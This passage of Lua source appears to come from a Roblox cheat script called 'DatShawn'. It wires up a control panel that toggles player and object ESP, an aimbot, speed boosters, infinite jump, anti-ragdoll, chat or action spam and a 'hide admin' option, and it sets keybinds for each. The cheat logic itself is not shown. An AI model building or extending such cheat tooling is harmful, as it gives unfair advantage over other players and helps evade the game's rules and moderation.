		Position = enabled and UDim2.fromOffset(24, 2) or UDim2.fromOffset(2, 2)
	}):Play()
end

local function bearTrapOwnerText(trap)
	local function playerFromValue(value)
		if typeof(value) == "Instance" and value:IsA("Player") then return value end
		local number = tonumber(value)
		if number then
			for _, player in ipairs(Players:GetPlayers()) do if player.UserId == number then return player end end
		end
		local text = tostring(value or "")
		for _, player in ipairs(Players:GetPlayers()) do
			if text == player.Name or text == player.DisplayName or string.find(text:lower(), player.Name:lower(), 1, true) then return player end
		end
	end

	for _, object in ipairs({trap, trap and trap.Parent}) do
		if object then
			for _, attribute in ipairs({"Owner", "OwnerName", "Username", "Player", "UserId", "OwnerUserId", "CreatedBy", "Creator"}) do
				local player = playerFromValue(object:GetAttribute(attribute))
				if player then return player.DisplayName .. " (@" .. player.Name .. ")'s Bear Trap" end
			end
			for _, childName in ipairs({"Owner", "OwnerName", "Username", "Player", "UserId", "OwnerUserId", "CreatedBy", "Creator"}) do
				local valueObject = object:FindFirstChild(childName)
				if valueObject and valueObject:IsA("ValueBase") then
					local player = playerFromValue(valueObject.Value)
					if player then return player.DisplayName .. " (@" .. player.Name .. ")'s Bear Trap" end
				end
			end
		end
	end

	local combinedName = tostring(trap and trap.Name or "") .. " " .. tostring(trap and trap.Parent and trap.Parent.Name or "")
	local player = playerFromValue(combinedName)
	if player then return player.DisplayName .. " (@" .. player.Name .. ")'s Bear Trap" end
	return "Unknown Owner's Bear Trap"
end

local function bearTrapObject(object)
	if not object or not object.Parent then return nil end
	local name = object.Name:lower():gsub("[%s_%-]", "")
	if not (name:find("beartrap", 1, true) or (name:find("bear", 1, true) and name:find("trap", 1, true))) then return nil end
	if object:IsA("Model") or object:IsA("BasePart") then return object end
	return object:FindFirstAncestorWhichIsA("Model")
end

local function updateBoosterMini()
	paintBoosterSwitch(BoosterRegularToggle, "PLAYER BOOSTER", State.Regular, Color3.fromRGB(38, 165, 95))
	paintBoosterSwitch(BoosterGiantToggle, "GIANT POTION SPEED", State.Giant, Color3.fromRGB(135, 70, 195))
	if State.WaitingForKey ~= "Regular" then BoosterRegularKey.Text = keyDisplay(RegularKey) end
	if State.WaitingForKey ~= "Giant" then BoosterGiantKey.Text = keyDisplay(GiantKey) end
end

connect(BoosterMini:GetPropertyChangedSignal("Position"), function()
	Settings.BoosterMiniPosition = BoosterMini.Position
	queuePositionSave()
end)
local Status = textLabel("Ready", UDim2.fromOffset(16, 399), UDim2.fromOffset(358, 20), 9, false)
Status.TextColor3 = Color3.fromRGB(140, 140, 160)

local function paintToggle(object, enabled, activeColor)
	paintSliderToggle(object, enabled, activeColor)
end

local function updateGUI()
	updateBoosterMini()
	paintToggle(AutoPotionToggle, State.AutoPotion)
	paintToggle(ESPToggle, State.ESP)
	paintToggle(RegularToggle, State.Regular)
	paintToggle(GiantToggle, State.Giant, Color3.fromRGB(135, 65, 190))
	paintToggle(CarpetToggle, State.Carpet, Color3.fromRGB(205, 115, 40))
	paintToggle(JumpToggle, State.Jump)
	paintToggle(BaseESPToggle, State.BaseESP, Color3.fromRGB(55, 155, 210))
	paintToggle(AimbotToggle, State.Aimbot, Color3.fromRGB(215, 75, 75))
	paintToggle(AntiRagdollToggle, State.AntiRagdoll, Color3.fromRGB(145, 75, 200))
	paintToggle(TradeRegionToggle, State.TradeRegionBlock, Color3.fromRGB(45, 145, 185))
	paintToggle(TradePlazaToggle, State.TradePlazaBlock, Color3.fromRGB(45, 145, 185))
	paintToggle(ActionsPanelToggle, State.ActionsPanel, Color3.fromRGB(105, 75, 225))
	paintToggle(QuickPanelToggle, State.QuickPanel, Color3.fromRGB(55, 145, 215))
	paintToggle(APSpamToggle, State.APSpam, Color3.fromRGB(155, 70, 185))
	paintToggle(XDSpamToggle, State.XDSpam, Color3.fromRGB(45, 180, 105))
	if XDSpamToggle then
		XDSpamToggle.BackgroundColor3 = State.XDSpam and Color3.fromRGB(45, 180, 105) or Color3.fromRGB(225, 70, 90)
	end
	if XDSpamPanel then XDSpamPanel.Visible = State.XDSpam end
	if XDBubble then XDBubble.Visible = State.XDSpam end
	if XDCfgFrame and not State.XDSpam then XDCfgFrame.Visible = false end
	paintToggle(DefensePanelToggle, State.DefensePanel, Color3.fromRGB(205, 65, 85))
	paintToggle(CooldownPanelToggle, State.CooldownPanel, Color3.fromRGB(65, 115, 205))
	paintToggle(Env.DatShawnFeatureControls.BrainrotESPToggle, State.BrainrotESP, Color3.fromRGB(215, 165, 45))
	paintToggle(Env.DatShawnFeatureControls.CloneESPToggle, State.CloneESP, Color3.fromRGB(210, 65, 65))
	paintToggle(Env.DatShawnFeatureControls.MineESPToggle, State.MineESP, Color3.fromRGB(210, 65, 65))
	paintToggle(Env.DatShawnFeatureControls.BearTrapESPToggle, State.BearTrapESP, Color3.fromRGB(235, 235, 245))
	paintToggle(Env.DatShawnFeatureControls.AntiTurretToggle, State.AntiTurret, Color3.fromRGB(205, 65, 85))
	paintToggle(Env.DatShawnFeatureControls.QuickPickupToggle, State.QuickPickup, Color3.fromRGB(45, 170, 105))
	paintToggle(Env.DatShawnFeatureControls.HideGUIToggle, State.HideGUI, Color3.fromRGB(90, 75, 190))
	paintToggle(Env.DatShawnFeatureControls.GameOptimizerToggle, State.GameOptimizer, Color3.fromRGB(85, 190, 125))
	paintToggle(Env.DatShawnFeatureControls.HideAdminToggle, State.HideAdmin, Color3.fromRGB(90, 75, 190))
	paintToggle(Env.DatShawnFeatureControls.AntiInverseToggle, State.AntiInverse, Color3.fromRGB(55, 175, 115))
	paintToggle(Env.DatShawnFeatureControls.AntiIntruderToggle, State.IntruderAlert, Color3.fromRGB(220, 55, 70))
	if State.WaitingForKey ~= "BrainrotESP" then Env.DatShawnFeatureControls.BrainrotESPKeyButton.Text = keyDisplay(Settings.BrainrotESPKey) end
	if State.WaitingForKey ~= "CloneESP" then Env.DatShawnFeatureControls.CloneESPKeyButton.Text = keyDisplay(Settings.CloneESPKey) end
	if State.WaitingForKey ~= "MineESP" then Env.DatShawnFeatureControls.MineESPKeyButton.Text = keyDisplay(Settings.MineESPKey) end
	if State.WaitingForKey ~= "BearTrapESP" then Env.DatShawnFeatureControls.BearTrapESPKeyButton.Text = keyDisplay(Settings.BearTrapESPKey) end
	if State.WaitingForKey ~= "AntiTurret" then Env.DatShawnFeatureControls.AntiTurretKeyButton.Text = keyDisplay(Settings.AntiTurretKey) end
	if State.WaitingForKey ~= "QuickPickup" then Env.DatShawnFeatureControls.QuickPickupKeyButton.Text = keyDisplay(Settings.QuickPickupKey) end
	if State.WaitingForKey ~= "HideGUI" then Env.DatShawnFeatureControls.HideGUIKeyButton.Text = keyDisplay(Settings.HideGUIKey) end
	if State.WaitingForKey ~= "GameOptimizer" then Env.DatShawnFeatureControls.GameOptimizerKeyButton.Text = keyDisplay(Settings.GameOptimizerKey) end
	if State.WaitingForKey ~= "HideAdmin" then Env.DatShawnFeatureControls.HideAdminKeyButton.Text = keyDisplay(Settings.HideAdminKey) end
	if State.WaitingForKey ~= "AntiInverse" then Env.DatShawnFeatureControls.AntiInverseKeyButton.Text = keyDisplay(Settings.AntiInverseKey) end
	if State.WaitingForKey ~= "IntruderAlert" then Env.DatShawnFeatureControls.AntiIntruderKeyButton.Text = keyDisplay(Settings.IntruderAlertKey) end
	if type(Env.DatShawnRefreshDefenseToggles) == "function" then Env.DatShawnRefreshDefenseToggles() end
	if QuickPanel then QuickPanel.Visible = State.QuickPanel end
	if APSpamPanel then APSpamPanel.Visible = State.APSpam end
	if CooldownPanel then CooldownPanel.Visible = State.CooldownPanel end
	if APConfigBubble then APConfigBubble.Visible = State.APSpam end
	if XDSpamPanel then XDSpamPanel.Visible = State.XDSpam end
	if DefensePanel then DefensePanel.Visible = State.DefensePanel end
	if ActionsPanel then ActionsPanel.Visible = State.ActionsPanel end
	if APConfigFrame and not State.APSpam then APConfigFrame.Visible = false end
	if State.WaitingForKey ~= "Regular" then RegularKeyButton.Text = keyDisplay(RegularKey) end
	if State.WaitingForKey ~= "Giant" then GiantKeyButton.Text = keyDisplay(GiantKey) end
	if State.WaitingForKey ~= "Carpet" then CarpetKeyButton.Text = keyDisplay(CarpetKey) end
	if State.WaitingForKey ~= "Jump" then JumpKeyButton.Text = keyDisplay(JumpKey) end
	if State.WaitingForKey ~= "AntiRagdoll" then AntiRagdollKeyButton.Text = keyDisplay(AntiRagdollKey) end
	if State.WaitingForKey ~= "TradeRegion" then TradeRegionKeyButton.Text = keyDisplay(TradeRegionKey) end
	if State.WaitingForKey ~= "TradePlaza" then TradePlazaKeyButton.Text = keyDisplay(TradePlazaKey) end
	if ActionControls.Buttons.RagdollTech and State.WaitingForKey ~= "RagdollTech" then ActionControls.Buttons.RagdollTech.Text = keyDisplay(ActionControls.RagdollTechKey); ActionControls.Buttons.RagdollTech.BackgroundColor3 = Color3.fromRGB(65, 105, 205) end
	if ActionControls.Buttons.InstantReset and State.WaitingForKey ~= "InstantReset" then ActionControls.Buttons.InstantReset.Text = keyDisplay(ActionControls.InstantResetKey); ActionControls.Buttons.InstantReset.BackgroundColor3 = Color3.fromRGB(65, 105, 205) end
	if ActionControls.Buttons.RagdollSelf and State.WaitingForKey ~= "RagdollSelf" then ActionControls.Buttons.RagdollSelf.Text = keyDisplay(ActionControls.RagdollSelfKey); ActionControls.Buttons.RagdollSelf.BackgroundColor3 = Color3.fromRGB(65, 105, 205) end
	if ActionControls.Buttons.Rejoin and State.WaitingForKey ~= "Rejoin" then ActionControls.Buttons.Rejoin.Text = keyDisplay(RejoinKey); ActionControls.Buttons.Rejoin.BackgroundColor3 = Color3.fromRGB(65, 105, 205) end
	if ActionControls.Buttons.Leave and State.WaitingForKey ~= "Leave" then ActionControls.Buttons.Leave.Text = keyDisplay(LeaveKey); ActionControls.Buttons.Leave.BackgroundColor3 = Color3.fromRGB(65, 105, 205) end
	if State.Carpet then
		Status.Text = "Active: CARPET booster at " .. tostring(CarpetSpeed)
	elseif isStealActive() and isGiant() and State.Giant then
        Status.Text = "Active: GIANT booster at " .. tostring(GiantSpeed)
    elseif isStealActive() and State.Regular then
        Status.Text = "Active: PLAYER booster at " .. tostring(RegularSpeed)
	else
		Status.Text = "Ready"
	end
end

local function toggleESP()
	State.ESP = not State.ESP
	if State.ESP then enableESP() else disableESP() end
	saveSettings()
	updateGUI()
	notify("Player ESP: " .. (State.ESP and "ON" or "OFF"), State.ESP)
end

local function setCarpetEnabled(enabled)
	State.Carpet = enabled == true
	if type(Env.DatShawnRefreshCarpetButton) == "function" then Env.DatShawnRefreshCarpetButton(State.Carpet) end
	Env.CarpetSpeedDesired = State.Carpet
	if type(Env.SabcomSetCarpetSpeed) == "function" then Env.SabcomSetCarpetSpeed(CarpetSpeed) end
	if type(Env.SabcomSetCarpetKeybind) == "function" then Env.SabcomSetCarpetKeybind(CarpetKey) end
	if type(Env.Sabcom_SetCarpetSpeed) == "function" then Env.Sabcom_SetCarpetSpeed(State.Carpet) end
	saveSettings()
	updateGUI()
	notify("Carpet Booster: " .. (enabled and "ON" or "OFF"), enabled)
end

Env.DatShawnToggleCarpet = function() setCarpetEnabled(not State.Carpet) end

connect(AutoPotionToggle.MouseButton1Click, function()
	State.AutoPotion = not State.AutoPotion; saveSettings(); updateGUI()
	notify("Auto Giant Potion: " .. (State.AutoPotion and "ON" or "OFF"), State.AutoPotion)
end)
connect(QuickPanelToggle.MouseButton1Click, function()
	State.QuickPanel = not State.QuickPanel
	QuickPanel.Visible = State.QuickPanel
	saveSettings(); updateGUI()
	notify("Quick Panel: " .. (State.QuickPanel and "ON" or "OFF"), State.QuickPanel)
end)
connect(CooldownPanelToggle.MouseButton1Click, function()
	State.CooldownPanel = not State.CooldownPanel
	CooldownPanel.Visible = State.CooldownPanel
	saveSettings(); updateGUI()
	notify("Command Cooldowns: " .. (State.CooldownPanel and "ON" or "OFF"), State.CooldownPanel)
end)
connect(APSpamToggle.MouseButton1Click, function()
	State.APSpam = not State.APSpam
	APSpamPanel.Visible = State.APSpam
	if not State.APSpam then
		APConfigFrame.Visible = false
	end
	saveSettings(); updateGUI()
	notify("DatShawn AP SPAM: " .. (State.APSpam and "ON" or "OFF"), State.APSpam)
end)
connect(XDSpamToggle.MouseButton1Click, function()
	State.XDSpam = not State.XDSpam
	if XDSpamPanel then XDSpamPanel.Visible = State.XDSpam end
	saveSettings(); updateGUI()
	notify("XD SPAM: " .. (State.XDSpam and "ON" or "OFF"), State.XDSpam)
end)
connect(DefensePanelToggle.MouseButton1Click, function()
	State.DefensePanel = not State.DefensePanel
	if DefensePanel then DefensePanel.Visible = State.DefensePanel end
	saveSettings(); updateGUI()
	notify("Auto Defense Panel: " .. (State.DefensePanel and "ON" or "OFF"), State.DefensePanel)
end)
connect(ActionsPanelToggle.MouseButton1Click, function()
	State.ActionsPanel = not State.ActionsPanel
	if ActionsPanel then ActionsPanel.Visible = State.ActionsPanel end
	saveSettings(); updateGUI()
	notify("Actions Panel: " .. (State.ActionsPanel and "ON" or "OFF"), State.ActionsPanel)
end)
connect(ESPToggle.MouseButton1Click, toggleESP)
connect(Env.DatShawnFeatureControls.BrainrotESPToggle.MouseButton1Click, function() State.BrainrotESP = not State.BrainrotESP; saveSettings(); updateGUI(); notify("Brainrot ESP: " .. (State.BrainrotESP and "ON" or "OFF"), State.BrainrotESP) end)
connect(Env.DatShawnFeatureControls.CloneESPToggle.MouseButton1Click, function() State.CloneESP = not State.CloneESP; saveSettings(); updateGUI(); notify("Clone ESP: " .. (State.CloneESP and "ON" or "OFF"), State.CloneESP) end)
connect(Env.DatShawnFeatureControls.MineESPToggle.MouseButton1Click, function() State.MineESP = not State.MineESP; saveSettings(); updateGUI(); notify("Mine ESP: " .. (State.MineESP and "ON" or "OFF"), State.MineESP) end)
connect(Env.DatShawnFeatureControls.BearTrapESPToggle.MouseButton1Click, function() State.BearTrapESP = not State.BearTrapESP; saveSettings(); updateGUI(); notify("Bear Trap ESP: " .. (State.BearTrapESP and "ON" or "OFF"), State.BearTrapESP) end)
connect(Env.DatShawnFeatureControls.AntiTurretToggle.MouseButton1Click, function() State.AntiTurret = not State.AntiTurret; saveSettings(); updateGUI(); notify("Anti Turret: " .. (State.AntiTurret and "ON" or "OFF"), State.AntiTurret) end)
connect(Env.DatShawnFeatureControls.QuickPickupToggle.MouseButton1Click, function()
	State.QuickPickup = not State.QuickPickup
	QuickPickup.set(State.QuickPickup)
	saveSettings(); updateGUI()
	notify("Quick Pick Up: " .. (State.QuickPickup and "ON" or "OFF"), State.QuickPickup)
end)
connect(Env.DatShawnFeatureControls.HideGUIToggle.MouseButton1Click, function()
	Env.DatShawnPrivacyFeatures.setHideGUI(not State.HideGUI)
	updateGUI(); notify("Hide GUI on Equip: " .. (State.HideGUI and "ON" or "OFF"), State.HideGUI)
end)
connect(Env.DatShawnFeatureControls.GameOptimizerToggle.MouseButton1Click, function()
	State.GameOptimizer = not State.GameOptimizer
	Env.DatShawnGameOptimizer.set(State.GameOptimizer)
	saveSettings(); updateGUI()
	notify("Game Optimizer: " .. (State.GameOptimizer and "ON" or "OFF"), State.GameOptimizer)
end)
connect(Env.DatShawnFeatureControls.HideAdminToggle.MouseButton1Click, function()
	Env.DatShawnPrivacyFeatures.setHideAdmin(not State.HideAdmin)
	updateGUI(); notify("Hide Admin Panel: " .. (State.HideAdmin and "ON" or "OFF"), State.HideAdmin)
end)
connect(Env.DatShawnFeatureControls.AntiInverseToggle.MouseButton1Click, function()
	State.AntiInverse = not State.AntiInverse
	Env.DatShawnAntiInverseDesired = State.AntiInverse
	if type(Env.DatShawnAntiInverseSet) == "function" then Env.DatShawnAntiInverseSet(State.AntiInverse) end
	saveSettings(); updateGUI()
	notify("Anti Inverse / Bee: " .. (State.AntiInverse and "ON" or "OFF"), State.AntiInverse)
end)
connect(Env.DatShawnFeatureControls.AntiIntruderToggle.MouseButton1Click, function()
	State.IntruderAlert = not State.IntruderAlert
	saveSettings(); updateGUI()
	notify("Anti Intruder Alert: " .. (State.IntruderAlert and "ON" or "OFF"), State.IntruderAlert)
end)
connect(Env.DatShawnFeatureControls.HideGUIItemBox.FocusLost, function()
	Env.DatShawnPrivacyFeatures.setHideItem(Env.DatShawnFeatureControls.HideGUIItemBox.Text)
end)
connect(RegularToggle.MouseButton1Click, function()
	State.Regular = not State.Regular; saveSettings(); updateGUI()

	notify("Regular Booster: " .. (State.Regular and "ON" or "OFF"), State.Regular)
end)
connect(BoosterRegularToggle.MouseButton1Click, function()
	State.Regular = not State.Regular; saveSettings(); updateGUI()

	notify("Regular Booster: " .. (State.Regular and "ON" or "OFF"), State.Regular)
end)
connect(GiantToggle.MouseButton1Click, function()
	State.Giant = not State.Giant; saveSettings(); updateGUI()
	notify("Giant Booster: " .. (State.Giant and "ON" or "OFF"), State.Giant)
end)
connect(BoosterGiantToggle.MouseButton1Click, function()
	State.Giant = not State.Giant; saveSettings(); updateGUI()
	notify("Giant Booster: " .. (State.Giant and "ON" or "OFF"), State.Giant)
end)
connect(CarpetToggle.Activated, function() setCarpetEnabled(not State.Carpet) end)
connect(BaseESPToggle.MouseButton1Click, function()
	State.BaseESP = not State.BaseESP
	local detected = State.BaseESP and refreshBaseESP() or 0
	if not State.BaseESP then clearBaseESP() end
	saveSettings()
	updateGUI()
	if State.BaseESP then
		notify(detected > 0 and ("Base ESP ON — " .. detected .. " base(s)") or "Base ESP ON — no bases found", detected > 0,
			detected > 0 and nil or Color3.fromRGB(190, 125, 35))
	else
		notify("Base Allow + Timer ESP: OFF", false)
	end
end)
connect(AimbotToggle.MouseButton1Click, function()
	State.Aimbot = not State.Aimbot
	Env.DatShawnAimbotDesired = State.Aimbot
	if type(Env.DatShawnAimbotSet) == "function" then
		Env.DatShawnAimbotSet(State.Aimbot)
	end
	saveSettings()
	updateGUI()
	notify("Aimbot: " .. (State.Aimbot and "ON" or "OFF"), State.Aimbot)
end)
connect(AntiRagdollToggle.MouseButton1Click, function()
	setAntiRagdollEnabled(not State.AntiRagdoll)
	updateGUI()
	notify("Anti Ragdoll: " .. (State.AntiRagdoll and "ON" or "OFF"), State.AntiRagdoll)
end)
connect(TradeRegionToggle.MouseButton1Click, function()
	setTradeRegionEnabled(not State.TradeRegionBlock)
	updateGUI()
	notify("Trade Region Block: " .. (State.TradeRegionBlock and "ON" or "OFF"), State.TradeRegionBlock)
end)
connect(TradePlazaToggle.MouseButton1Click, function()
	setTradePlazaEnabled(not State.TradePlazaBlock)
	updateGUI()
	notify("Trade Plaza Block: " .. (State.TradePlazaBlock and "ON" or "OFF"), State.TradePlazaBlock)
end)
connect(JumpToggle.Activated, function()
	State.Jump = not State.Jump
	Env.InfiniteJumpDesired = State.Jump
	if type(Env.SetInfiniteJump) == "function" then Env.SetInfiniteJump(State.Jump) end
	saveSettings()
	updateGUI()
	notify("Infinite Jump: " .. (State.Jump and "ON" or "OFF"), State.Jump)
end)

local function beginKeyChoice(kind, object)
	State.WaitingForKey = kind
	object.Text = "..."
	object.BackgroundColor3 = Color3.fromRGB(190, 135, 35)
end
connect(RegularKeyButton.MouseButton1Click, function() beginKeyChoice("Regular", RegularKeyButton) end)
connect(BoosterRegularKey.MouseButton1Click, function() beginKeyChoice("Regular", BoosterRegularKey) end)
connect(GiantKeyButton.MouseButton1Click, function() beginKeyChoice("Giant", GiantKeyButton) end)
connect(BoosterGiantKey.MouseButton1Click, function() beginKeyChoice("Giant", BoosterGiantKey) end)
connect(CarpetKeyButton.MouseButton1Click, function() beginKeyChoice("Carpet", CarpetKeyButton) end)
connect(JumpKeyButton.MouseButton1Click, function() beginKeyChoice("Jump", JumpKeyButton) end)
connect(AntiRagdollKeyButton.MouseButton1Click, function() beginKeyChoice("AntiRagdoll", AntiRagdollKeyButton) end)
connect(TradeRegionKeyButton.MouseButton1Click, function() beginKeyChoice("TradeRegion", TradeRegionKeyButton) end)
connect(TradePlazaKeyButton.MouseButton1Click, function() beginKeyChoice("TradePlaza", TradePlazaKeyButton) end)
connect(Env.DatShawnFeatureControls.BrainrotESPKeyButton.MouseButton1Click, function() beginKeyChoice("BrainrotESP", Env.DatShawnFeatureControls.BrainrotESPKeyButton) end)
connect(Env.DatShawnFeatureControls.CloneESPKeyButton.MouseButton1Click, function() beginKeyChoice("CloneESP", Env.DatShawnFeatureControls.CloneESPKeyButton) end)
connect(Env.DatShawnFeatureControls.MineESPKeyButton.MouseButton1Click, function() beginKeyChoice("MineESP", Env.DatShawnFeatureControls.MineESPKeyButton) end)
connect(Env.DatShawnFeatureControls.BearTrapESPKeyButton.MouseButton1Click, function() beginKeyChoice("BearTrapESP", Env.DatShawnFeatureControls.BearTrapESPKeyButton) end)
connect(Env.DatShawnFeatureControls.AntiTurretKeyButton.MouseButton1Click, function() beginKeyChoice("AntiTurret", Env.DatShawnFeatureControls.AntiTurretKeyButton) end)
connect(Env.DatShawnFeatureControls.QuickPickupKeyButton.MouseButton1Click, function() beginKeyChoice("QuickPickup", Env.DatShawnFeatureControls.QuickPickupKeyButton) end)
connect(Env.DatShawnFeatureControls.HideGUIKeyButton.MouseButton1Click, function() beginKeyChoice("HideGUI", Env.DatShawnFeatureControls.HideGUIKeyButton) end)
connect(Env.DatShawnFeatureControls.GameOptimizerKeyButton.MouseButton1Click, function() beginKeyChoice("GameOptimizer", Env.DatShawnFeatureControls.GameOptimizerKeyButton) end)
connect(Env.DatShawnFeatureControls.HideAdminKeyButton.MouseButton1Click, function() beginKeyChoice("HideAdmin", Env.DatShawnFeatureControls.HideAdminKeyButton) end)
connect(Env.DatShawnFeatureControls.AntiInverseKeyButton.MouseButton1Click, function() beginKeyChoice("AntiInverse", Env.DatShawnFeatureControls.AntiInverseKeyButton) end)
connect(Env.DatShawnFeatureControls.AntiIntruderKeyButton.MouseButton1Click, function() beginKeyChoice("IntruderAlert", Env.DatShawnFeatureControls.AntiIntruderKeyButton) end)

-- ===================== CTRL PANEL: KEYBIND EVERY SETTING =====================
local CtrlKeybinds = {}
local function ctrlBind(name, buttonObject, callback)
    if not buttonObject or not buttonObject.Parent then return end
    local row=buttonObject.Parent
    if not row:IsA("Frame") then return end

    local directMain = (row == Main)
    local originalPos = buttonObject.Position
    local originalSize = buttonObject.Size

    local kb=Instance.new("TextButton")
    kb.Name="CtrlKeybind_"..name
    kb.Size=UDim2.fromOffset(48,28)

    if directMain then
        -- These controls live directly inside Main. Do not use the row-relative
        -- coordinates, which would place the keybind at the top of the panel.
        kb.Position=UDim2.new(
            originalPos.X.Scale, originalPos.X.Offset - 52,
            originalPos.Y.Scale, originalPos.Y.Offset
        )
        buttonObject.Position=originalPos
        buttonObject.Size=originalSize
    else
        kb.Position=UDim2.new(1,-112,0,6)
        buttonObject.Position=UDim2.new(1,-58,0,6)
        buttonObject.Size=UDim2.fromOffset(50,28)
    end

    kb.BackgroundColor3=Color3.fromRGB(50,115,155)
    kb.TextColor3=Color3.new(1,1,1)
    kb.TextSize=9
    kb.Font=Enum.Font.FredokaOne
    kb.AutoButtonColor=false
    kb.Text=keyDisplay(Settings.CtrlKeybinds[name] or Enum.KeyCode.Unknown)
    kb.Parent=row
    Instance.new("UICorner",kb).CornerRadius=UDim.new(0,6)

    CtrlKeybinds[name]={button=kb,callback=callback,key=Settings.CtrlKeybinds[name] or Enum.KeyCode.Unknown}
    kb.MouseButton1Click:Connect(function() beginKeyChoice("CTRL:"..name,kb) end)
end
ctrlBind("AutoPotion",AutoPotionToggle,function() State.AutoPotion=not State.AutoPotion; saveSettings(); updateGUI(); notify("Auto Giant Potion: "..(State.AutoPotion and "ON" or "OFF"),State.AutoPotion) end)
ctrlBind("PlayerBooster",Env.DatShawnPlayerBoosterOpenButton,function() Env.DatShawnSetPlayerBoosterVisible(not BoosterMini.Visible) end)
ctrlBind("PlayerESP",ESPToggle,function() toggleESP() end)
ctrlBind("BaseESP",BaseESPToggle,function() State.BaseESP=not State.BaseESP; local detected=State.BaseESP and refreshBaseESP() or 0; if not State.BaseESP then clearBaseESP() end; saveSettings(); updateGUI(); notify(State.BaseESP and (detected>0 and ("Base ESP ON — "..detected.." base(s)") or "Base ESP ON — no bases found") or "Base Allow + Timer ESP: OFF",State.BaseESP) end)
ctrlBind("Nearest",Env.DatShawnCtrlNearestButton,function() local api=Env.DatShawnGrabController; if api then api.nearest(not api.nearestOn()) end end)
ctrlBind("Priority",Env.DatShawnCtrlPriorityButton,function() local api=Env.DatShawnGrabController; if api then api.priority(not api.priorityOn()) end end)
ctrlBind("Carpet",Env.DatShawnCtrlCarpetButton,function() if type(Env.DatShawnToggleCarpet)=="function" then Env.DatShawnToggleCarpet() end end)
ctrlBind("Mount",Env.DatShawnCtrlMountPicker,function() local i=table.find(mountOptions,Settings.CarpetMountChoice) or 1; Settings.CarpetMountChoice=mountOptions[i%#mountOptions+1]; updateMountPicker(); saveSettings() end)
ctrlBind("MyBaseTimer",Env.DatShawnCtrlTimerToggle,function() showBaseTimer(not MyBaseTimer.Visible) end)
ctrlBind("Aimbot",AimbotToggle,function() State.Aimbot=not State.Aimbot; Env.DatShawnAimbotDesired=State.Aimbot; if type(Env.DatShawnAimbotSet)=="function" then Env.DatShawnAimbotSet(State.Aimbot) end; saveSettings(); updateGUI(); notify("Aimbot: "..(State.Aimbot and "ON" or "OFF"),State.Aimbot) end)
ctrlBind("ActionsPanel",ActionsPanelToggle,function() State.ActionsPanel=not State.ActionsPanel; if ActionsPanel then ActionsPanel.Visible=State.ActionsPanel end; saveSettings(); updateGUI(); notify("Actions Panel: "..(State.ActionsPanel and "ON" or "OFF"),State.ActionsPanel) end)
ctrlBind("QuickPanel",QuickPanelToggle,function() State.QuickPanel=not State.QuickPanel; QuickPanel.Visible=State.QuickPanel; saveSettings(); updateGUI(); notify("Quick Panel: "..(State.QuickPanel and "ON" or "OFF"),State.QuickPanel) end)
ctrlBind("APSpam",APSpamToggle,function() State.APSpam=not State.APSpam; APSpamPanel.Visible=State.APSpam; if not State.APSpam then APConfigFrame.Visible=false end; saveSettings(); updateGUI(); notify("DatShawn AP SPAM: "..(State.APSpam and "ON" or "OFF"),State.APSpam) end)
ctrlBind("XDSpam",XDSpamToggle,function() State.XDSpam=not State.XDSpam; if XDSpamPanel then XDSpamPanel.Visible=State.XDSpam end; saveSettings(); updateGUI(); notify("XD SPAM: "..(State.XDSpam and "ON" or "OFF"),State.XDSpam) end)
ctrlBind("DefensePanel",DefensePanelToggle,function() State.DefensePanel=not State.DefensePanel; if DefensePanel then DefensePanel.Visible=State.DefensePanel end; saveSettings(); updateGUI(); notify("Auto Defense Panel: "..(State.DefensePanel and "ON" or "OFF"),State.DefensePanel) end)
ctrlBind("CooldownPanel",CooldownPanelToggle,function() State.CooldownPanel=not State.CooldownPanel; CooldownPanel.Visible=State.CooldownPanel; saveSettings(); updateGUI(); notify("Command Cooldowns: "..(State.CooldownPanel and "ON" or "OFF"),State.CooldownPanel) end)

for name,spec in pairs(CtrlKeybinds) do if not Settings.CtrlKeybinds[name] then Settings.CtrlKeybinds[name]=spec.key end end
local CtrlKeybindInput=UIS.InputBegan:Connect(function(input,processed)
    if State.WaitingForKey and type(State.WaitingForKey)=="string" and State.WaitingForKey:sub(1,6)=="CTRL:" and input.UserInputType==Enum.UserInputType.Keyboard then
        local name=State.WaitingForKey:sub(7); local spec=CtrlKeybinds[name]; local chosen=input.KeyCode==Enum.KeyCode.Backspace and Enum.KeyCode.Unknown or input.KeyCode; State.WaitingForKey=nil
        if spec then spec.key=chosen; Settings.CtrlKeybinds[name]=chosen; spec.button.Text=keyDisplay(chosen); saveSettings() end
        return
    end
    if processed or UIS:GetFocusedTextBox() then return end
    for _,spec in pairs(CtrlKeybinds) do if spec.key~=Enum.KeyCode.Unknown and input.KeyCode==spec.key then spec.callback(); return end end
end)
local function filterBox(box)
	local filtered = box.Text:gsub("[^%d%.]", "")
	local decimal = filtered:find("%.")
	if decimal then filtered = filtered:sub(1, decimal) .. filtered:sub(decimal + 1):gsub("%.", "") end
	if box.Text ~= filtered then box.Text = filtered end
end
connect(RegularBox:GetPropertyChangedSignal("Text"), function() filterBox(RegularBox) end)
connect(GiantBox:GetPropertyChangedSignal("Text"), function() filterBox(GiantBox) end)
connect(CarpetBox:GetPropertyChangedSignal("Text"), function() filterBox(CarpetBox) end)
connect(RegularBox.FocusLost, function()
	RegularSpeed = math.clamp(tonumber(RegularBox.Text) or RegularSpeed, 0, MAX_SPEED)
	Settings.RegularSpeed = RegularSpeed
	if type(Env.DatShawnBoosterSetSpeed) == "function" then Env.DatShawnBoosterSetSpeed(RegularSpeed) end
	RegularBox.Text = tostring(RegularSpeed)
	saveSettings()
	updateGUI()
end)
connect(GiantBox.FocusLost, function()
	GiantSpeed = math.clamp(tonumber(GiantBox.Text) or GiantSpeed, 0, MAX_SPEED)
	Settings.GiantSpeed = GiantSpeed
	GiantBox.Text = tostring(GiantSpeed)
	saveSettings()
	updateGUI()
end)
connect(CarpetBox.FocusLost, function()
	CarpetSpeed = math.clamp(tonumber(CarpetBox.Text) or CarpetSpeed, 0, MAX_CARPET_SPEED)
	Settings.CarpetSpeed = CarpetSpeed
	CarpetBox.Text = tostring(CarpetSpeed)
	if type(Env.SabcomSetCarpetSpeed) == "function" then Env.SabcomSetCarpetSpeed(CarpetSpeed) end
	saveSettings()
	updateGUI()
end)

connect(UIS.InputBegan, function(input, processed)
	-- Either Ctrl key opens/closes the main panel.
	if not UIS:GetFocusedTextBox() and (input.KeyCode == Enum.KeyCode.LeftControl or input.KeyCode == Enum.KeyCode.RightControl) then
		toggleMainPanel()
		return
	end
	if State.WaitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
		local kind = State.WaitingForKey
		local chosenKey = input.KeyCode == Enum.KeyCode.Backspace and Enum.KeyCode.Unknown or input.KeyCode
